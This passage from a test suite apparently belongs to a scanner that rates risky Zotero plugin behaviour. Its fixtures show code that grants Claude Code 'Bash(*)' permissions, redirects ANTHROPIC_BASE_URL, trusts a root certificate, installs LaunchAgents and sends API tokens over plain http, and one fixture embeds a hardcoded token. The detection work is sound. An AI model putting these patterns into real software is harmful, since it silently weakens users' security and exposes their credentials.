        async function addPath() { const rc = PathUtils.join(home(), ".zshrc"); const text = await IOUtils.readUTF8(rc);
          await IOUtils.writeUTF8(rc, text + "\\nexport PATH=$PATH:~/bin\\n"); }`,
    });
    expect(settings(writeRc)).toEqual([{ change: "shell", asks: "click" }]);
    const writeClaude = await scanFiles({
      "content/a.js": `${home}
        async function setKey(k) { const p = PathUtils.join(home(), ".claude", "settings.json"); const s = JSON.parse(await IOUtils.readUTF8(p));
          s.env = { ANTHROPIC_API_KEY: k }; await IOUtils.writeJSON(p, s); }`,
    });
    expect(settings(writeClaude)).toEqual([
      { change: "app-config", target: "Claude Code", asks: "click" },
    ]);
    // A folder built up on a file object, then copied into or written through a stream
    // (jurism-word-for-windows-integration, zotero-mcp-neo).
    const word = await scanFiles({
      "content/a.js": `function installDot(dot) { const folder = Services.dirsvc.get("AppData", Ci.nsIFile).clone();
          folder.appendRelativePath("Microsoft\\\\Word\\\\Startup"); dot.copyTo(folder, "Zotero.dot"); }
        btn.addEventListener("command", () => installDot(bundled));`,
    });
    expect(settings(word)).toEqual([{ change: "office-macros", target: "Word", asks: "click" }]);
    const skill = await scanFiles({
      "content/a.js": `btn.addEventListener("click", () => { const home = Services.dirsvc.get("Home", Ci.nsIFile);
          const relPath = { "claude-code": ".claude/skills/fixture" }[target]; const dir = home.clone();
          for (const p of relPath.split("/")) dir.append(p);
          const file = dir.clone(); file.append("SKILL.md");
          const os = Cc["@mozilla.org/network/file-output-stream;1"].createInstance(Ci.nsIFileOutputStream);
          os.init(file, 2, 420, 0); });`,
    });
    expect(settings(skill)).toEqual([{ change: "skills", target: "Claude Code", asks: "click" }]);
  });

  it("rates Find Available PDF sources by how long they last (pdferret, zone, zotero-style, nexus)", async () => {
    const shutdown = await scanFiles({
      "content/a.js": `var KEY = "extensions.zotero.findPDFs.resolvers";
        function sync() { Zotero.Prefs.set(KEY, JSON.stringify([{ name: "Sci-Hub" }]), true); }
        function cleanup() { Zotero.Prefs.set(KEY, JSON.stringify(external()), true); }
        function startup() { sync(); } function shutdown() { cleanup(); }`,
    });
    expect(settings(shutdown)).toEqual([
      { change: "find-pdf", asks: "none", auto: true, whileInstalled: true },
    ]);
    expect(concern(shutdown)).toBe("low");
    // Taking its own old entries out adds none.
    const zone = await scanFiles({
      "content/a.js": `function migrate() { const list = JSON.parse(Zotero.Prefs.get("extensions.zotero.findPDFs.resolvers", true));
          const remaining = list.filter((x) => !legacy.includes(x));
          Zotero.Prefs.set("extensions.zotero.findPDFs.resolvers", JSON.stringify(remaining), true); }
        function startup() { migrate(); }`,
    });
    expect(capIn(zone, "changes-settings")).toBeUndefined();
    const style = await scanFiles({
      "prefs.js": `pref("extensions.zotero.findPDFs.resolvers", '{"name":"Sci-Hub","url":"https://sci-hub.example/{doi}"}');`,
    });
    expect(settings(style)).toEqual([{ change: "find-pdf", asks: "none", asDefault: true }]);
    expect(concern(style)).toBe("low");
    const nexus = await scanFiles({
      "content/a.js": `function load() { this.old = Zotero.Attachments.getFileResolvers; Zotero.Attachments.getFileResolvers = (item, m) => [...this.old(item, m), nexus]; }
        function unload() { Zotero.Attachments.getFileResolvers = this.oldGetFileResolvers; }
        function startup() { load(); }`,
    });
    expect(settings(nexus)).toEqual([
      { change: "find-pdf", asks: "none", auto: true, whileInstalled: true },
    ]);
  });

  it("counts ZOTERO_CONFIG changed in memory while it runs (epa-zotero-plugin)", async () => {
    const r = await scanFiles({
      "content/a.js": `var P = { patch(ZOTERO_CONFIG) { for (const key of Object.keys(this.old)) { ZOTERO_CONFIG[key] = ""; } },
          addToWindow(window) { this.patch(window.ZOTERO_CONFIG); } };
        function onMainWindowLoad({ window }) { P.addToWindow(window); }`,
    });
    expect(settings(r)).toEqual([
      { change: "zotero-config", asks: "none", auto: true, whileInstalled: true },
    ]);
    expect(concern(r)).toBe("low");
  });

  it("rates trusting a certificate high unless it waits for a setting that's off (banyan)", async () => {
    const code = (
      guard: string,
    ) => `function confirmTrust() { return Services.prompt.confirm(null, "Banyan", "Trust?"); }
      async function trust(state) { if (!confirmTrust()) throw new Error("cancelled");
        await runMacCommand("/usr/bin/security", ["add-trusted-cert", "-d", "-r", "trustRoot", "-k", keychain, ca]); }
      async function initProxy(port) { ${guard} await trust(state); }
      async function startup() { await initProxy(23119); }
      function runMacCommand(p, args) { return Subprocess.call({ command: p, arguments: args }); }`;
    const banyan = await scanFiles({
      "prefs.js": `pref("extensions.zotero.banyan.httpsProxyEnabled", false);`,
      "content/a.js": code(`if (!Zotero.isMac || !getPref("httpsProxyEnabled")) return null;`),
    });
    expect(settings(banyan)).toEqual([
      {
        change: "certificate",
        target: "macOS",
        asks: "confirm",
        auto: true,
        setting: "httpsProxyEnabled",
      },
    ]);
    expect(concern(banyan)).toBe("medium");
    const always = await scanFiles({ "content/a.js": code("") });
    expect(concern(always)).toBe("high");
  });

  it("reads a script it ships and runs: autostart at startup is high, from a button medium (zotero-spotlight-search)", async () => {
    const script = `#!/bin/bash
APP_INSTALL="/Applications"
AGENT_PLIST="$HOME/Library/LaunchAgents/com.example.app.plist"
cp -R dist/Example.app "$APP_INSTALL/"
launchctl load "$AGENT_PLIST"
echo "To remove it: launchctl unload $AGENT_PLIST"`;
    const run = `async function buildAndInstall() { await Zotero.Utilities.Internal.exec("/bin/bash", ["-c", 'cd "$1" && bash install.sh', "--", dir]); }`;
    const silent = await scanFiles({
      "native/install.sh": script,
      "content/a.js": `${run} async function checkAndInstall() { await buildAndInstall(); }
        async function onStartup() { checkAndInstall(); }`,
    });
    expect(settings(silent)).toEqual([
      { change: "autostart", target: "a macOS LaunchAgent", asks: "none", auto: true },
      { change: "program-install", target: "/Applications", asks: "none", auto: true },
    ]);
    expect(concern(silent)).toBe("high");
    const button = await scanFiles({
      "native/install.sh": script,
      "content/a.js": `${run} btn.addEventListener("command", () => buildAndInstall());`,
    });
    expect(concern(button)).toBe("medium");
    // A script nothing runs (a developer's leftover) changes nothing.
    const unused = await scanFiles({
      "native/install.sh": script,
      "content/a.js": `Zotero.Utilities.Internal.exec("/usr/bin/open", [path]);`,
    });
    expect(capIn(unused, "changes-settings")).toBeUndefined();
  });

  it("finds another program's settings file only where the code writes it (garden-for-zotero)", async () => {
    const helpers = `function home() { return Services.dirsvc.get("Home", Ci.nsIFile).path; }
      async function writeUtf8(path, text) { await IOUtils.writeUTF8(path, text); }`;
    const garden = await scanFiles({
      "content/a.js": `${helpers}
        function getConfigPath(target) { const h = home(); return target === "claude-code" ? PathUtils.join(h, ".claude", "settings.json") : PathUtils.join(h, ".codex", "config.toml"); }
        async function inject(payload) { const path = getConfigPath(payload.target); const text = await IOUtils.readUTF8(path);
          await writeUtf8(path, merge(text, { env: { ANTHROPIC_BASE_URL: payload.baseUrl } })); }`,
    });
    expect(settings(garden)).toEqual([
      { change: "app-config", target: "Claude Code", asks: "click" },
      { change: "app-config", target: "Codex CLI", asks: "click" },
    ]);
    expect(concern(garden)).toBe("medium");
    // Only reading it (zotero-research) isn't a change.
    const read = await scanFiles({
      "content/a.js": `${helpers}
        async function provider() { const p = PathUtils.join(home(), ".claude", "settings.json"); return JSON.parse(await IOUtils.readUTF8(p)).env; }`,
    });
    expect(capIn(read, "changes-settings")).toBeUndefined();
    // Allowing tools in Claude Code's permissions loosens its prompts.
    const perms = await scanFiles({
      "content/a.js": `${helpers}
        async function allow() { const p = PathUtils.join(home(), ".claude", "settings.json"); const s = JSON.parse(await IOUtils.readUTF8(p));
          s.permissions = { allow: ["Bash(*)"] }; await writeUtf8(p, JSON.stringify(s)); }`,
    });
    expect(settings(perms)).toEqual([
      { change: "agent-permissions", target: "Claude Code", asks: "click" },
    ]);
    expect(concern(perms)).toBe("high");
  });

  it("names skill folders under the home folder, not its own workspace, and Word's startup folder (mcp-neo, banyan)", async () => {
    const skills = await scanFiles({
      "content/a.js": `btn.addEventListener("click", () => { const home = Services.dirsvc.get("Home", Ci.nsIFile);
          const map = { cursor: ".cursor/skills/fixture", "claude-code": ".claude/skills/fixture" };
          const f = home.clone(); f.append(map[target]); const os = Cc["@mozilla.org/network/file-output-stream;1"].createInstance(Ci.nsIFileOutputStream);
          os.init(f, 2, 420, 0); converter.writeString(skill); });`,
    });
    expect(settings(skills)).toEqual([
      { change: "skills", target: "Claude Code", asks: "click" },
      { change: "skills", target: "Cursor", asks: "click" },
    ]);
    expect(concern(skills)).toBe("low");
    const workspace = await scanFiles({
      "content/a.js": `async function seed(ws) { await IOUtils.writeUTF8(PathUtils.join(ws, ".claude/skills/fixture", "SKILL.md"), skill); }`,
    });
    expect(capIn(workspace, "changes-settings")).toBeUndefined();
    const word = await scanFiles({
      "content/a.js": `(() => { var WORD_STARTUP = ["Microsoft", "Word", "STARTUP"];
          function startupDir() { return PathUtils.join(appData(), ...WORD_STARTUP); }
          async function copyTemplate(dir) { await Zotero.File.download(templateUrl, PathUtils.join(dir, "Fixture.dotm")); }
          async function installTemplate() { const dir = startupDir(); await copyTemplate(dir); }
          async function templateInstalled() { const dir = startupDir(); return IOUtils.exists(dir); }
          btn.addEventListener("command", installTemplate); })();`,
    });
    expect(settings(word)).toEqual([{ change: "office-macros", target: "Word", asks: "click" }]);
  });

  it("reads commands in argument lists, and not a config snippet it never runs (aidea, paper-notion-flow, mcp-neo)", async () => {
    const r = await scanFiles({
      "content/a.js": `function acceptToS(condaBin) { return runCondaCmd(condaBin, ["config", "--set", "plugins.auto_accept_tos", "yes"]); }
        function runCondaCmd(bin, args) { return Subprocess.call({ command: bin, arguments: args }); }
        function autoUpdate() { const inner = "npm install -g @openai/codex@latest && codex --version"; return run("/bin/sh", ["-c", inner]); }
        function run(p, args) { return Subprocess.call({ command: p, arguments: args }); }
        function onStartup() { autoUpdate(); }`,
    });
    expect(settings(r)).toEqual([
      { change: "app-config", target: "conda", asks: "click" },
      { change: "global-install", target: "@openai/codex", asks: "none", auto: true },
    ]);
    // `claude mcp add` counts as an argument list it runs, not as a line to paste.
    const mcp = await scanFiles({
      "content/a.js": `function register(claudePath, port) { return Subprocess.call({ command: claudePath, arguments: ["mcp", "add", "--transport", "http", "fixture", url(port)] }); }`,
    });
    expect(settings(mcp)).toEqual([{ change: "mcp-config", asks: "click" }]);
    const snippet = await scanFiles({
      "content/a.js": `const clients = [{ name: "claude", renderConfig: (port) => \`claude mcp add --transport http zotero http://127.0.0.1:\${port}/mcp\` }];`,
    });
    expect(capIn(snippet, "changes-settings")).toBeUndefined();
  });
});

describe("data handed to programs it launches or to companions on this computer (C39)", () => {
  const programs = (r: ScanOutput) =>
    (r.analysis.network.programs ?? []).map((p) => `${p.program} (${p.provider})`);

  it("names the service behind a program it launches (edge-playback, wakatime-cli, pdf2zh)", async () => {
    const edge = await scanFiles({
      "content/a.js": `const playback = findCommandPath("edge-playback");
        function speak(text) { const p = Cc["@mozilla.org/process/util;1"].createInstance(Ci.nsIProcess);
          p.init(bash); p.runAsync(["-c", \`\${playback} --text "\${text}"\`], 2); }`,
    });
    expect(programs(edge)).toEqual(["edge-tts (Microsoft)"]);
    expect(edge.card.dataSharing).toBe("named-third-parties");
    const waka = await scanFiles({
      "content/a.js": `const bin = \`wakatime-cli-\${os}-\${arch}\`;
        function beat(title) { return Subprocess.call({ command: PathUtils.join(home, ".wakatime", bin), arguments: ["--entity", title] }); }`,
    });
    expect(programs(waka)).toEqual(["wakatime-cli (WakaTime)"]);
    const app = await scanFiles({
      "content/a.js": `const macs = ["/Applications/pdf2zh.app"]; Subprocess.call({ command: "/usr/bin/open", arguments: ["-a", macs[0], "--args", pdf] });`,
    });
    expect(programs(app)).toEqual([
      "pdf2zh (Google Translate, or the translator it's set up with)",
    ]);
    // Named but never run: no launch, no hand-off.
    const docs = await scanFiles({ "content/a.js": `const tip = "Install edge-tts first";` });
    expect(docs.analysis.network.programs).toBeUndefined();
  });

  it("reads the program a setting's default runs (cliPath, aiCommand, command, hermesPath)", async () => {
    const r = await scanFiles({
      "prefs.js": [
        'pref("extensions.zotero.annota.cliPath", "claude");',
        'pref("extensions.zotero.paperflow.aiCommand", "codex");',
        'pref("extensions.zotero.readmate.command", "pi --append-system-prompt \\"Read the paper\\"");',
        'pref("extensions.zotero.yangmei.hermesPath", "hermes");',
        'pref("extensions.zotero.x.llmProvider", "gemini");',
      ].join("\n"),
      "content/a.js": `function run(cmd, args) { return Subprocess.call({ command: cmd, arguments: args }); }`,
    });
    expect(programs(r).sort()).toEqual([
      "Claude Code (Anthropic)",
      "Codex CLI (OpenAI)",
      "Hermes Agent (the AI provider it's set up with)",
      "Pi (the AI provider it's set up with)",
    ]);
    // A plugin that launches nothing hands nothing to them.
    const idle = await scanFiles({ "prefs.js": 'pref("extensions.x.cliPath", "claude");' });
    expect(idle.analysis.network.programs).toBeUndefined();
  });

  it("names Antigravity's agy and a program setting's fallback, not KaTeX's \\pi", async () => {
    const r = await scanFiles({
      "content/a.js": `const backends = { agy: { command: "agy" } };
        const cmd = cfg.cliPath || "claude";
        const symbols = { π: "\\\\pi" };
        Subprocess.call({ command: cmd, arguments: ["-p", q] });`,
    });
    expect(programs(r).sort()).toEqual(["Antigravity (Google)", "Claude Code (Anthropic)"]);
    // A tool's path held in a name, and a program first in a command line.
    const held = await scanFiles({
      "content/a.js": `Subprocess.call({ command: hermesPath, arguments: ["acp"] });
        Subprocess.call({ command: "/bin/sh", arguments: ["-c", \`pdf2zh_next "\${pdf}" --output "\${dir}"\`] });`,
    });
    expect(programs(held).sort()).toEqual([
      "Hermes Agent (the AI provider it's set up with)",
      "pdf2zh-next (SiliconFlow, or the engine it's set up with)",
    ]);
  });

  it("reads what its shipped Python imports or requires (pdf2zh_next, notebooklm-py)", async () => {
    const r = await scanFiles({
      "backend/worker.py":
        "from pdf2zh_next.high_level import do_translate_async_stream\npdf2zh = 'pdf2zh'\n",
      "backend/requirements.txt": "fastapi>=0.110\nnotebooklm-py[cookies]>=0.7.1\n",
      "content/a.js": `Subprocess.call({ command: "python3", arguments: [root + "backend/worker.py"] });`,
    });
    expect(programs(r).sort()).toEqual([
      "NotebookLM (Google)",
      "pdf2zh-next (SiliconFlow, or the engine it's set up with)",
    ]);
  });

  it("names a companion on this computer by the code around its address (Edge voices, OpenClaw)", async () => {
    const edge = await scanFiles({
      "scripts/tts.js": `const TTS = { url: "http://localhost:5000/v1/audio/speech", voices: { en: "en-US-AriaNeural" } };
        async function speak(text) { return fetch(TTS.url, { method: "POST", body: JSON.stringify({ input: text }) }); }`,
    });
    expect(programs(edge)).toEqual(["edge-tts (Microsoft)"]);
    const claw = await scanFiles({
      "openclaw.js": `const serverUrl = Zotero.Prefs.get("extensions.openclaw.serverUrl", true) || "http://localhost:18789";
        fetch(serverUrl + "/v1/chat/completions", { method: "POST", body: JSON.stringify({ model: "openclaw/glm-5", messages }) });`,
    });
    expect(programs(claw)).toEqual(["OpenClaw (the AI provider it's set up with)"]);
    expect(claw.card.dataSharing).toBe("named-third-parties");
    // A local voice server (Kokoro), a model runtime, or its own MCP endpoint shown for a client.
    const kokoro = await scanFiles({
      "scripts/tts.js": `fetch("http://127.0.0.1:8880/v1/audio/speech", { method: "POST", body: JSON.stringify({ voice: "af_heart", input: text }) });`,
    });
    expect(kokoro.analysis.network.programs).toBeUndefined();
    const mcp = await scanFiles({
      "content/a.js": `const clients = { codex: { url: \`http://127.0.0.1:\${port}/mcp\` } }; fetch("http://localhost:11434/api/chat", { method: "POST", body: "hermes" });`,
    });
    expect(mcp.analysis.network.programs).toBeUndefined();
  });

  it("counts a browser extension for a known web app that it serves files to (NotebookLM)", async () => {
    const r = await scanFiles({
      "content/a.js": `Zotero.Server.Endpoints["/notebooklm/file"] = function () {};
        const hint = "Install the Chrome extension, then export to NotebookLM";`,
    });
    expect(programs(r)).toEqual(["NotebookLM (Google)"]);
    // Endpoints for any chat composer: no known service behind them.
    const any = await scanFiles({
      "content/a.js": `Zotero.Server.Endpoints["/harvest/bundle"] = function () {};
        const hint = "The browser extension pastes the bundle into any chat";`,
    });
    expect(any.analysis.network.programs).toBeUndefined();
  });

  it("reads the sites a browser extension it ships may reach (zotero-prism)", async () => {
    const r = await scanFiles({
      "content/browser-extension/manifest.json": JSON.stringify({
        manifest_version: 3,
        background: { service_worker: "background.js" },
        host_permissions: ["http://127.0.0.1/*", "https://chatgpt.com/*", "<all_urls>"],
      }),
    });
    expect(hostIn(r, "chatgpt.com")?.usage).toBe("request");
    expect(hostIn(r, "127.0.0.1")).toBeUndefined();
    // The Chinese web chats it relays to are AI providers, not servers we couldn't identify.
    const chats = await scanFiles({
      "content/browser-extension/manifest.json": JSON.stringify({
        manifest_version: 3,
        background: { service_worker: "background.js" },
        host_permissions: [
          "https://chat.qwen.ai/*",
          "https://tongyi.aliyun.com/*",
          "https://www.doubao.com/*",
          "https://yuanbao.tencent.com/*",
        ],
      }),
    });
    for (const h of ["chat.qwen.ai", "tongyi.aliyun.com", "www.doubao.com", "yuanbao.tencent.com"])
      expect(hostIn(chats, h)?.category).toBe("llm-provider");
    expect(chats.card.dataSharing).toBe("named-third-parties");
  });

  it("calls a companion unknown when its job is done online and nothing names it (texglot)", async () => {
    const code = {
      "content/a.js": `var DEFAULT_BASE = "http://127.0.0.1:8765";
        async function send(item) { return fetch(DEFAULT_BASE + "/api/jobs", { method: "POST", body: JSON.stringify({ source: item }) }); }`,
    };
    const r = await scanFiles(code, {
      rawManifest: manifestJson(
        {},
        { description: "Send Zotero papers to a local TeXGlot service and keep translated PDFs." },
      ),
    });
    expect(r.analysis.network.programs).toMatchObject([
      { program: "TeXGlot", provider: "", category: "unknown" },
    ]);
    expect(r.card.dataSharing).toBe("unknown-endpoints");
    // Self-hosted, or a job that isn't done online: as before.
    const own = await scanFiles(code, {
      rawManifest: manifestJson(
        {},
        { description: "Translate papers on your own server (self-hosted)." },
      ),
    });
    expect(own.card.dataSharing).toBe("user-configured-only");
    const sync = await scanFiles(code, {
      rawManifest: manifestJson({}, { description: "Sync your files across devices." }),
    });
    expect(sync.card.dataSharing).toBe("user-configured-only");
    // The services it asks keys for, when the plugin names them (zotero-bilingual-pdf).
    const keyed = await scanFiles(
      {
        "content/a.js": `${code["content/a.js"]}
          const hint = "Enter your Doc2X API Key and DeepSeek API Key first";`,
      },
      { rawManifest: manifestJson({}, { description: "Batch translate academic PDFs." }) },
    );
    expect(programs(keyed)).toEqual(["a program on this computer (DeepSeek and Doc2X)"]);
    expect(keyed.card.dataSharing).toBe("named-third-parties");
  });

  it("keeps a backend at an address the user sets as a server they set up, unless its job is an online service (paperpulse)", async () => {
    const code = {
      "prefs.js": `pref("extensions.paperpulse.backendURL", "http://127.0.0.1:18095");`,
      "content/a.js": `function base() { return Zotero.Prefs.get("extensions.paperpulse.backendURL", true) || "http://127.0.0.1:18095"; }
        async function analyze(item) { return fetch(base() + "/api/zotero/analyze", { method: "POST", body: JSON.stringify({ title: item.title }) }); }`,
    };
    const own = await scanFiles(code, {
      rawManifest: manifestJson(
        {},
        { description: "Analyze Zotero items with a PaperPulse backend and write scores back." },
      ),
    });
    expect(own.analysis.network.programs).toBeUndefined();
    expect(own.card.dataSharing).toBe("user-configured-only");
    // A translator's desktop app at a user-set address still relays to an online service.
    const relay = await scanFiles(code, {
      rawManifest: manifestJson(
        {},
        { description: "Translate selected text with the Lingo desktop translator." },
      ),
    });
    expect(relay.analysis.network.programs).toMatchObject([
      { program: "Lingo", provider: "", category: "unknown" },
    ]);
    expect(relay.card.dataSharing).toBe("unknown-endpoints");
  });
});

describe("user data sent over plain http (cleartext-http sweep)", () => {
  const sent = (r: ScanOutput) => capIn(r, "sends-unencrypted")?.details?.unencrypted;
  const plain = (r: ScanOutput, host: string) => hostIn(r, host)?.flags.includes("unencrypted");
  const concern = (r: ScanOutput) =>
    r.card.capabilities.find((c) => c.id === "sends-unencrypted")?.concern;

  it("flags text sent over http to an internet host, not over https or on this computer's network (lingocloud)", async () => {
    const r = await scanFiles({
      "content/a.js": `async function translate(data) { const secret = "3975l6lr5pcbvidl6jl2";
        return Zotero.HTTP.request("POST", "http://api.interpreter.caiyunai.com/v1/translator", {
          headers: { "content-type": "application/json", "x-authorization": \`token \${secret}\` },
          body: JSON.stringify({ source: [data.raw], trans_type: "auto2zh" }), responseType: "json" }); }`,
    });
    expect(sent(r)).toEqual([
      { host: "api.interpreter.caiyunai.com", sends: ["content", "credentials"] },
    ]);
    expect(plain(r, "api.interpreter.caiyunai.com")).toBe(true);
    expect(concern(r)).toBe("medium");
    const safe = await scanFiles({
      "content/a.js": `fetch("https://api.interpreter.caiyunai.com/v1/translator", { method: "POST", body: text });
        fetch("http://127.0.0.1:8080/translate", { method: "POST", body: text });
        fetch("http://192.168.1.20/api", { method: "POST", body: text });`,
    });
    expect(capIn(safe, "sends-unencrypted")).toBeUndefined();
    expect(safe.analysis.network.hosts.some((h) => h.flags.includes("unencrypted"))).toBe(false);
  });

  it("rates identifiers and searches sent to a catalogue low, a question to another host medium (rvk-classifier, zsearch)", async () => {
    const isbn = await scanFiles({
      "content/a.js": `const SRU_SOURCES = [{ name: "HEBIS", field: "marcxml.isbn", base: "http://sru.hebis.de/sru/DB=2.1?version=1.1&operation=searchRetrieve" }];
        const MAX_RECORDS = 10;
        async function fetchByISBN(isbn) { return Promise.allSettled(SRU_SOURCES.map(async ({ field, base }) => {
          const query = encodeURIComponent(\`\${field}=\${isbn}\`);
          const url = \`\${base}&query=\${query}&maximumRecords=\${MAX_RECORDS}\`;
          return Zotero.HTTP.request("GET", url, { timeout: 5e3 }); })); }`,
    });
    expect(sent(isbn)).toEqual([{ host: "sru.hebis.de", sends: ["identifiers"] }]);
    expect(concern(isbn)).toBe("low");
    const search = (host: string) =>
      scanFiles({
        "content/a.js": `var API_URL = "http://${host}/api/query";
          async function search(searchQuery, start) {
            const url = API_URL + "?search_query=" + encodeURIComponent(searchQuery) + "&start=" + start;
            return Zotero.HTTP.request("GET", url, { responseType: "text" }); }`,
      });
    expect(sent(await search("export.arxiv.org"))).toEqual([
      { host: "export.arxiv.org", sends: ["identifiers"] },
    ]);
    expect(sent(await search("ask.fixture-chat.com"))).toEqual([
      { host: "ask.fixture-chat.com", sends: ["content"] },
    ]);
  });

  it("follows a helper whose callback makes the request, and esbuild's private methods (plus-plus, polarrec)", async () => {
    const helper = await scanFiles({
      "content/a.js": `async function translationRequest(task, method, url, options = {}) {
          return await runWhileActive(task, () => Zotero.HTTP.request(method, url, { ...options, requestObserver(xhr) { task.xhr = xhr; } })); }
        var translate = async function(data) {
          return translationRequest(data, "POST", "http://api.interpreter.caiyunai.com/v1/translator", {
            headers: { "x-authorization": \`token \${data.secret}\` }, body: JSON.stringify({ source: [data.raw] }) }); };`,
    });
    expect(hostIn(helper, "api.interpreter.caiyunai.com")?.usage).toBe("request");
    expect(sent(helper)).toEqual([
      { host: "api.interpreter.caiyunai.com", sends: ["content", "credentials"] },
    ]);
    const polarrec = await scanFiles({
      "content/a.js": `var _getApiUrlBase, getApiUrlBase_fn;
        _getApiUrlBase = new WeakSet();
        getApiUrlBase_fn = function() { return false ? "http://127.0.0.1:5000" : "http://34.73.167.164:8080"; };
        function sendReco(targetData) {
          const apiUrl = __privateMethod(this, _getApiUrlBase, getApiUrlBase_fn).call(this) + "/recommend";
          window.fetch(apiUrl, { method: "POST", body: JSON.stringify({ target_resources: targetData }) }); }`,
    });
    expect(hostIn(polarrec, "34.73.167.164")?.usage).toBe("request");
    expect(sent(polarrec)).toEqual([{ host: "34.73.167.164", sends: ["content"] }]);
  });

  it("notes an http server tried only after https ones, with what goes to it (zotero-reference)", async () => {
    const r = await scanFiles({
      "content/a.js": `var ENDPOINTS = Object.freeze(["https://pro.fixture-dev.xyz/v1/activate", "https://backup.fixture-dev.workers.dev/v1/activate", "http://124.156.114.124:5000/v1/activate"]);
        function resolveEndpoints(options) { return options.endpoints ?? ENDPOINTS; }
        async function activate(user, activation) {
          const endpoints = resolveEndpoints({});
          const body = { zotero: user.uid, code: activation.code };
          for (const [index, endpoint] of endpoints.entries()) {
            try { return await withDeadline(() => Zotero.HTTP.request("POST", endpoint, { body: JSON.stringify(body) })); }
            catch (e) { if (index === endpoints.length - 1) throw e; } } }`,
    });
    expect(sent(r)).toEqual([
      { host: "124.156.114.124", sends: ["content", "credentials"], fallback: true },
    ]);
    expect(concern(r)).toBe("medium");
    // A list of pages, not one service on several servers, isn't requested by that loop.
    const pages = await scanFiles({
      "content/a.js": `const HELP = ["https://docs.fixture-dev.xyz/start", "http://old.fixture-dev.xyz/faq"];
        async function ping(urls) { for (const url of urls) await fetch(url, { method: "POST", body: note }); }`,
    });
    expect(hostIn(pages, "old.fixture-dev.xyz")?.usage).not.toBe("request");
    expect(capIn(pages, "sends-unencrypted")).toBeUndefined();
  });

  it("reads keys and a site's own token apart, and counts a fixed request that sends nothing only as unencrypted", async () => {
    const keyed = await scanFiles({
      "content/a.js": `async function t(text, appid) { const salt = Date.now();
        return fetch("http://api.fanyi.baidu.com/api/trans/vip/translate?appid=" + appid + "&salt=" + salt + "&q=" + encodeURIComponent(text)); }`,
    });
    expect(sent(keyed)).toEqual([
      { host: "api.fanyi.baidu.com", sends: ["content", "credentials"] },
    ]);
    const csrf = await scanFiles({
      "content/a.js": `async function find(title, cnipaCsrfToken, cookieStr) {
        const postData = \`searchWord=\${encodeURIComponent(title)}&pageNo=1&__RequestVerificationToken=\${encodeURIComponent(cnipaCsrfToken)}\`;
        return fetch("http://epub.cnipa.gov.cn/Dxb/IndexQuery", { method: "POST", body: postData, headers: { Cookie: cookieStr } }); }`,
    });
    expect(sent(csrf)).toEqual([{ host: "epub.cnipa.gov.cn", sends: ["identifiers"] }]);
    // Zotero's cookie sandbox is how the request runs, not something sent.
    const sandbox = await scanFiles({
      "content/a.js": `Zotero.HTTP.processDocuments("http://search.dangdang.com/?key=" + isbn, (doc) => parse(doc), null, cookieSandbox);`,
    });
    expect(sent(sandbox)).toEqual([{ host: "search.dangdang.com", sends: ["identifiers"] }]);
    const fixed = await scanFiles({
      "content/a.js": `async function appId() { const xhr = await Zotero.HTTP.request("GET", "http://capi.dict.cn/fanyi.php", { headers: { Referer: "http://fanyi.dict.cn/" }, responseType: "text" }); return xhr.response; }`,
    });
    expect(plain(fixed, "capi.dict.cn")).toBe(true);
    expect(capIn(fixed, "sends-unencrypted")).toBeUndefined();
  });

  it("doesn't take an address tied to a request only by a common name for a sent one (zotero-reference's DOI links, zsearch)", async () => {
    const r = await scanFiles({
      "content/a.js": `function toRef(item) { const reference = {}; reference.url = \`http://doi.org/\${item.DOI}\`; return reference; }
        function parse(el, arxivId) { const url = el.link || (arxivId ? \`http://arxiv.org/abs/\${arxivId}\` : ""); return { url }; }
        async function requestText(url, options) { return Zotero.HTTP.request("GET", url, options); }
        async function manifest(manifestRequest) { return requestText(manifestRequest.url, { headers: { Accept: "text/plain" } }); }
        async function lookup(doi, email) { const url = \`https://api.crossref.org/works/\${doi}?mailto=\${email}\`; return Zotero.HTTP.request("GET", url); }`,
    });
    expect(plain(r, "doi.org")).toBeFalsy();
    expect(plain(r, "arxiv.org")).toBeFalsy();
    expect(capIn(r, "sends-unencrypted")).toBeUndefined();
    // A Python script it ships: a prefix test isn't a request, its call to a service is.
    const py = await scanFiles({
      "backend/sources.py": `import requests
if url.startswith(("http://arxiv.org/abs/", "https://arxiv.org/abs/")):
    pass
r = requests.post("http://spotlight.dbpedia.org/rest/annotate", data={"text": text})
`,
      "content/a.js": `Subprocess.call({ command: "python3", arguments: [root + "backend/sources.py"] });`,
    });
    expect(plain(py, "arxiv.org")).toBeFalsy();
    expect(plain(py, "spotlight.dbpedia.org")).toBe(true);
  });

  it("counts an address in a shipped Python script only when a request call reaches it (papermachines)", async () => {
    const r = await scanFiles({
      "content/processors/geo.py": `import urllib2
import requests
BASE = "https://api.example-fixture.org"
class Geo:
    spotlight_url = 'http://spotlight.example-fixture.org/rest/annotate'
    def annotate(self, data):
        req = urllib2.Request(self.spotlight_url, data)
        return urllib2.urlopen(req).read()
    def places(self, geonameid, entity):
        # see http://docs.example-fixture.org/api
        uri = entity.get('@URI', 'http://dbpedia.example-fixture.org/resource/')
        entityURI = 'http://sws.example-fixture.org/' + str(geonameid)
        query_url = 'http://ws.example-fixture.org/' \\
            + 'searchJSON?q=' + geonameid
        return uri, entityURI, urllib2.urlopen(query_url)
def ask(q):
    return requests.post(f"{BASE}/v1/ask", json={"q": q})
`,
      // Through its own request helpers, a function that hands the address back, and a loop
      // over mirrors (aidea's Copilot base, twintext's model mirrors).
      "content/bridge.py": `import urllib.request
COPILOT_BASE = "https://copilot.example-fixture.org"
MIRRORS = ("https://mirror.example-fixture.org", "https://models.example-fixture.org")
def _post_json(url, payload):
    req = urllib.request.Request(url, data=payload)
    return urllib.request.urlopen(req).read()
def _post_with_retry(
    url,
    payload,
):
    return _post_json(url, payload)
def _base(token):
    if not token:
        return COPILOT_BASE
    return token
def forward(token, payload):
    base_url = _base(token)
    return _post_with_retry(f"{base_url}/v1/messages", payload)
def endpoints():
    result = []
    for value in MIRRORS:
        result.append(value.rstrip("/"))
    return tuple(result)
def download(name):
    for i, endpoint in enumerate(endpoints()):
        _post_json(f"{endpoint}/{name}", None)
`,
      "content/a.js": `Subprocess.call({ command: "python", arguments: [script] });`,
    });
    for (const h of [
      "spotlight.example-fixture.org",
      "ws.example-fixture.org",
      "api.example-fixture.org",
      "copilot.example-fixture.org",
      "mirror.example-fixture.org",
      "models.example-fixture.org",
    ])
      expect(hostIn(r, h)?.usage).toBe("request");
    expect(plain(r, "ws.example-fixture.org")).toBe(true);
    // Linked Data identifiers and a default value are names; a comment isn't code.
    for (const h of ["sws.example-fixture.org", "dbpedia.example-fixture.org"]) {
      expect(hostIn(r, h)?.usage).toBe("unknown");
